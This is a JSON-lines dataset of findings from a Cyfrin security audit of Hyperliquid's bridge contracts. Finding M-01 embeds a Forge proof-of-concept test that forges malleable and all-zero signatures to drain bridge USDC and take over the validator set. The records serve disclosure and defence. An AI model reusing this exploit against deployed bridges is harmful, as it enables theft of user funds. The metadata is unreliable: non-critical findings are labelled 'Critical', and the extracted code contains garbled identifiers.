{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-001", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 1, "page_start": null, "title": "[M-01] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`", "short_summary": null, "description_md": "### Description\n\nThe `ecrecover` built-in will return `address(0)` if it fails to recover the signer from a message digest and corresponding signature. There is no `address(0)` check in [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) or [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154).\n\nAnyone can submit bad signatures to steal bridge funds, calling `Bridge::withdraw`, or take over the bridge as a solitary validator, calling `Bridge::updateValidatorSet` if the validator set is initialized or updated to be a zero address validator set with threshold power. This is of course highly unlikely as it would not be within the validators' best interest; however, it is still possible and should be mitigated so long as bas signer recovery is an issue.\n\nAdditionally, it is possible to call `Bridge::withdraw` and `Bridge::updateValidatorSet` using malleable validator signatures. Due to the nature of elliptic curves, it is possible to modify a signature to create another unique signature which recovers to the same signer address. Fortunately, the `Bridge::processedWithdrawals` mapping and validator (epoch) checkpoints protect against replay. Along with bad signer recovery, this should be mitigated using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol).\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [M-01] Bad signature validation, malleability & lack of zero address protection in `updateValidatorSet`\n\n### Description\n\nThe `ecrecover` built-in will return `address(0)` if it fails to recover the signer from a message digest and corresponding signature. There is no `address(0)` check in [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) or [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154).\n\nAnyone can submit bad signatures to steal bridge funds, calling `Bridge::withdraw`, or take over the bridge as a solitary validator, calling `Bridge::updateValidatorSet` if the validator set is initialized or updated to be a zero address validator set with threshold power. This is of course highly unlikely as it would not be within the validators' best interest; however, it is still possible and should be mitigated so long as bas signer recovery is an issue.\n\nAdditionally, it is possible to call `Bridge::withdraw` and `Bridge::updateValidatorSet` using malleable validator signatures. Due to the nature of elliptic curves, it is possible to modify a signature to create another unique signature which recovers to the same signer address. Fortunately, the `Bridge::processedWithdrawals` mapping and validator (epoch) checkpoints protect against replay. Along with bad signer recovery, this should be mitigated using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol).\n\n### Proof of Concept\n\nThe following forge test can be seen to demonstrate these findings:\n\n```solidity\nfunction test_signatureMalleabilityAndBadValidation() public {\n    address sender = makeAddr(\"alice\");\n    address pwner = makeAddr(\"pwner\");\n    uint256 amount = 1e5;\n    uint256 nonce = 0;\n    ValidatorSet memory validatorSet = ValidatorSet(0, s_validators,s_powers);\n    Signature[] memory sigs = _getSignatures(sender, amount, nonce);\n    Signature[] memory sigsCache = sigs;\n    for (uint256 i = 0; i < sigs.length; ++i) {\n        sigs[i].s =\n            uint256(115792089237316195423570985008687907852837564279074904382605163141518161494337) - sigs[i].s;\n        sigs[i].v = sigs[i].v == 27 ? 28 : 27;\n    }\n    console.log(\"withdrawing with malleable signatures\");\n    vm.startPrank(sender);\n    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigs);\n    console.log(\n        \"fortunately, the `processedWithdrawals` mapping and validator(epoch) checkpoints protect against replay\"\n    );\n    vm.expectRevert(\"Already withdrawn\");\n    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigsCache);\n    ValidatorSet memory newValidatorSet = ValidatorSet(1, s_newValidators,s_newPowers);\n    vm.expectEmit(true, false, false, true);\n    emit ValidatorSetUpdatedEvent(newValidatorSet.epoch, newValidatorSetvalidators, newValidatorSet.powers);\n    Signature[] memory updateValidatorSigs = _getUpdateValidatorSignature(newValidatorSet, s_validatorKeys);\n    bridge.updateValidatorSet(newValidatorSet, validatorSet, validatorSetvalidators, updateValidatorSigs);\n    for (uint256 i = 0; i < updateValidatorSigs.length; ++i) {\n        updateValidatorSigs[i].s = uint256(\n            115792089237316195423570985008687907852837564279074904382605163141518161494337\n        ) - updateValidatorSigs[i].s;\n        updateValidatorSigs[i].v = updateValidatorSigs[i].v == 27 ? 28 : 27;\n    }\n    ValidatorSet memory emptyValidatorSet = ValidatorSet(2, s_zeroValidators,s_newPowers);\n    bridge.updateValidatorSet(\n        emptyValidatorSet, newValidatorSet, newValidatorSet.validators,_getUpdateValidatorSignatures(emptyValidatorSet, s_newValidatorKeys)\n    );\n    vm.expectRevert(\"New validator set epoch must be greater than the currentepoch\");\n    bridge.updateValidatorSet(newValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, updateValidatorSigs);\n    console.log(\"but what if validator set is updated to zero addressvalidator set with non-zero power?\");\n    address[] memory validatorArr = new address[](1);\n    validatorArr[0] = PWNER;\n    uint256[] memory powerArr = new uint256[](1);\n    powerArr[0] = uint256(1000000);\n    ValidatorSet memory pwnValidatorSet = ValidatorSet(3, validatorArr,powerArr);\n    Signature[] memory emptySigs = new Signature[](3);\n    emptySigs[0] = Signature(0, 0, 0);\n    emptySigs[1] = Signature(0, 0, 0);\n    emptySigs[2] = Signature(0, 0, 0);\n    console.log(\"anyone can submit bad signatures to steal bridge funds\");\n    changePrank(pwner);\n    emit log_named_uint(\"bridge balance before\", IERC20(USDC_ADDRESS)balanceOf(address(bridge)));\n    emit log_named_uint(\"pwner balance before\", IERC20(USDC_ADDRESS).balanceO(pwner));\n    bridge.withdraw(IERC20(USDC_ADDRESS).balanceOf(address(bridge)), 0,emptyValidatorSet, emptyValidatorSet.validators, emptySigs);\n    emit log_named_uint(\"pwner balance after\", IERC20(USDC_ADDRESS).balanceO(pwner));\n    emit log_named_uint(\"bridge balance after\", IERC20(USDC_ADDRESS).balanceO(address(bridge)));\n    vm.expectEmit(true, false, false, true);\n    emit ValidatorSetUpdatedEvent(pwnValidatorSet.epoch, pwnValidatorSetvalidators, pwnValidatorSet.powers);\n    bridge.updateValidatorSet(pwnValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, emptySigs);\n    console.log(\"or take over the bridge as a solitary validator\");\n}\n\nfunction _getUpdateValidatorSignatures(ValidatorSet memory newValidatorSet, uint256[] memory currValidatorKeys)\n    internal\n    view\n    returns (Signature[] memory)\n{\n    Signature[] memory signatures = new Signature[](s_validators.length);\n    bytes32 newCheckpoint =\n        keccak256(abi.encode(newValidatorSet.validators, newValidatorSetpowers, newValidatorSet.epoch));\n    Agent memory agent = Agent(\"a\", newCheckpoint);\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\",LOCALHOST_DOMAIN_HASH, hash(agent)));\n    for (uint256 i = 0; i < s_validators.length; ++i) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(currValidatorKeys[i],digest);\n        signatures[i] = Signature(uint256(r), uint256(s), v);\n    }\n    return signatures;\n}\nfunction _getWithdrawSignatures(address sender, uint256 amount, uint256nonce) internal view returns (Signature[] memory) {\n    Signature[] memory signatures = new Signature[](s_validators.length);\n    Agent memory agent = Agent(\"a\", keccak256(abi.encode(sender, amount,nonce)));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\",LOCALHOST_DOMAIN_HASH, hash(agent)));\n    for (uint256 i = 0; i < s_validators.length; ++i) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_validatorKeys[i], digest);\n        // console.log(\"validator: %s\", i);\n        // console.log(\"v: %s\", uint256(v));\n        // console.log(\"r: %s\", uint256(r));\n        // console.log(\"s: %s\", uint256(s));\n        signatures[i] = Signature(uint256(r), uint256(s), v);\n    }\n    return signatures;\n}\n```\n\n### Impact\n\nGiven the vulnerability described has a low likelihood but high impact, we evaluate the severity to MEDIUM.\n\n### Recommended Mitigation\n\nAs mentioned above, it is recommended to correctly validate recovered signers and protect against signature malleability by using the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol). Additionally, add zero address validation to `Bridge::updateValidatorSet` to ensure it is not possible to update the validator set to a vulnerable state.\n\n**Edit (2023-04-14):** OpenZeppelin `ECDSA` has a vulnerability in versions lower than 4.7.3, which can be exploited by an attacker. When using this library, use the latest version of @openzeppelin/contracts, or a version that is newer or at least 4.7.3.\n\n### `f045dbf` Resolution\n\nA zero address check has been added to `Signature.sol::recoverSigner` to address this finding. The client team states that they do not believe this is a feasible exploit since it requires 2/3 of the validators' coordination to perform the bad signature exploit, which only happens when the L1 and bridge’s integrity are already compromised, and that it should instead be a low/NC severity issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": "M-01", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": "M-01", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-002", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 2, "page_start": null, "title": "[M-02] Incorrect initialization of `powerThreshold` and lack of validation", "short_summary": null, "description_md": "### Description\n\nThe `Bridge::powerThreshold` should be 2/3 the sum of the validator power across current validators at any point; however, the [calculation](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94) in `Bridge2::constructor` is not correct and it's initialized to `(2 * _minTotalValidatorPower) / 3` while it should instead be `powerThreshold = (2 * cumulativePower) / 3;`, i.e. use the return value of `checkNewValidatorPowers` as is the case in `Bridge::updateValidatorSet`.\nFrom the fact that `cumulativePower >= minTotalValidatorPower`, it means the initialized `powerThreshold` is less than reasonable.\nFurthermore, from the communication with the client team, it is understood that `minTotalValidatorPower` is only used to prevent rounding issues and set once and not changed (immutable). Hence it is likely this value is not likely to be around the actual cumulative power but a lot less than it.\nBecause `powerThreshold` is initialized to a fairly less value, this can allow malicious actions that are lack of validation power.\n\nFurthermore, the protocol implements [admin functionality](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256) whereby `powerThreshold` can be set to an arbitrary value without any validation - this is not recommended and should be subject to the same validation that `powerThreshold` is at least 2/3 the sum of the total validator power and not over the sum of the total validator power.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [M-02] Incorrect initialization of `powerThreshold` and lack of validation\n\n### Description\n\nThe `Bridge::powerThreshold` should be 2/3 the sum of the validator power across current validators at any point; however, the [calculation](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94) in `Bridge2::constructor` is not correct and it's initialized to `(2 * _minTotalValidatorPower) / 3` while it should instead be `powerThreshold = (2 * cumulativePower) / 3;`, i.e. use the return value of `checkNewValidatorPowers` as is the case in `Bridge::updateValidatorSet`.\nFrom the fact that `cumulativePower >= minTotalValidatorPower`, it means the initialized `powerThreshold` is less than reasonable.\nFurthermore, from the communication with the client team, it is understood that `minTotalValidatorPower` is only used to prevent rounding issues and set once and not changed (immutable). Hence it is likely this value is not likely to be around the actual cumulative power but a lot less than it.\nBecause `powerThreshold` is initialized to a fairly less value, this can allow malicious actions that are lack of validation power.\n\nFurthermore, the protocol implements [admin functionality](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256) whereby `powerThreshold` can be set to an arbitrary value without any validation - this is not recommended and should be subject to the same validation that `powerThreshold` is at least 2/3 the sum of the total validator power and not over the sum of the total validator power.\n\n### Impact\n\nIt is possible malicious actions that are lack of validation power are allowed due to wrong initialization of `powerThreshold`.\nBecause the initializer is assumed to be called by an admin and there is also another admin function to change the `powerThreshold`, we evaluate the severity to MEDIUM.\n\n### Recommended Mitigation\n\n- Initialize `powerThreshold` to the 2/3 the sum of the initial validator powers.\n- Add validation for the new `powerThreshold` in `Bridge::changePowerThreshold()` to allow only reasonable values (ranging from 2/3 to total of the current cumulative validation power).\n\n### `f045dbf` Resolution\n\nThe calculation now uses the `cumulativePower` returned from `checkNewValidatorPowers` to set `powerThreshold` in the constructor. The client team states that this is also low/NC severity because the initial set of validators is intended to be the team, and future validator updates are not prone to this issue. The Cyfrin team maintains that this is medium severity in the scope of this audit given its limited scope and context.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": "M-02", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": "M-02", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-003", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 3, "page_start": null, "title": "[NC-01] Make `minTotalValidatorPower` immutable", "short_summary": null, "description_md": "Given that `Bridge::minTotalValidatorPower` is initialized once in the constructor and never modified thereafter, it can be made immutable. This also has the effect of reducing gas usage in functions which currently read its value from storage.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-01] Make `minTotalValidatorPower` immutable\n\nGiven that `Bridge::minTotalValidatorPower` is initialized once in the constructor and never modified thereafter, it can be made immutable. This also has the effect of reducing gas usage in functions which currently read its value from storage.\n\n### `f045dbf` Resolution\n\n`minTotalValidatorPower` is now immutable.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-01", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-01", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-004", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 4, "page_start": null, "title": "[NC-02] Avoid using an initializer unless absolutely necessary", "short_summary": null, "description_md": "[This comment](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L85-L86) references the potential introduction of a separate initializer but it should be noted that bad initialization is the cause of many exploits in the wild and so should be avoided wherever possible.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-02] Avoid using an initializer unless absolutely necessary\n\n[This comment](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L85-L86) references the potential introduction of a separate initializer but it should be noted that bad initialization is the cause of many exploits in the wild and so should be avoided wherever possible.\n\n### `f045dbf` Resolution\n\nThe comment has been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-02", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-02", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-005", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 5, "page_start": null, "title": "[NC-03] Use calldata for all function arguments that are not modified", "short_summary": null, "description_md": "If function arguments are not intended to be modified then it is best practice to pass them as calldata arguments rather than memory, for example in [https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#LL94C48-L94C48](`Bridge::updateValidatorSet`).\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-03] Use calldata for all function arguments that are not modified\n\nIf function arguments are not intended to be modified then it is best practice to pass them as calldata arguments rather than memory, for example in [https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#LL94C48-L94C48](`Bridge::updateValidatorSet`).\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Through testing we found that using memory seems to require less gas than calldata on Arbitrum, which is why we wrote everything using memory to begin with.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-03", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-03", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-006", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 6, "page_start": null, "title": "[NC-04] `updateValidatorSet` block scope is not necessary", "short_summary": null, "description_md": "The block scope in `Bridge::updateValidatorSet` is not necessary as the contract successfully compiles without it and so can be removed.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-04] `updateValidatorSet` block scope is not necessary\n\nThe block scope in `Bridge::updateValidatorSet` is not necessary as the contract successfully compiles without it and so can be removed.\n\n### `f045dbf` Resolution\n\nThe block scope has been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-04", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-04", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-007", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 7, "page_start": null, "title": "[NC-05] Emit events before interaction", "short_summary": null, "description_md": "To strictly conform to checks-effect-interactions, it is recommended to emit events prior to any [external interactions](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L122-L123). This is generally advised to ensure correct migration through state reconstruction, which in this case should not be affected given `Bridge::deposit` is marked as `nonReentrant`, but it is still good practice.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-05] Emit events before interaction\n\nTo strictly conform to checks-effect-interactions, it is recommended to emit events prior to any [external interactions](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L122-L123). This is generally advised to ensure correct migration through state reconstruction, which in this case should not be affected given `Bridge::deposit` is marked as `nonReentrant`, but it is still good practice.\n\n### `f045dbf` Resolution\n\nEvents are now emitted before external interactions.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-05", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-05", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-008", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 8, "page_start": null, "title": "[NC-06] Make USDC amount naming more verbose", "short_summary": null, "description_md": "The naming of the USDC amount parameter in [`Bridge::deposit and Bridge::withdraw`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L120-L152) is not clear, i.e. change `uint256 usdc` to `uin256 usdcAmount`.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-06] Make USDC amount naming more verbose\n\nThe naming of the USDC amount parameter in [`Bridge::deposit and Bridge::withdraw`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L120-L152) is not clear, i.e. change `uint256 usdc` to `uin256 usdcAmount`.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Does not seem like a useful change for us. `usdc` is clear since its of type `uint256`, and we use the same convention in the l1 code and solidity event fields\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-06", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-06", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-009", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 9, "page_start": null, "title": "[NC-07] Rename file to `Bridge2.sol` to match the contract name", "short_summary": null, "description_md": "The `Bridge2` contract resides in `Bridge.sol`; however, it is best practice to follow the convention of one contract per file with the same name.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-07] Rename file to `Bridge2.sol` to match the contract name\n\nThe `Bridge2` contract resides in `Bridge.sol`; however, it is best practice to follow the convention of one contract per file with the same name.\n\n### `f045dbf` Resolution\n\nThe client team has renamed the contract to `Bridge.sol` with the following comment:\n\n> We call it Bridge2 internally until it replaces the current bridge, at which point we will rename everything to Bridge.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-07", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-07", "Target": null}}
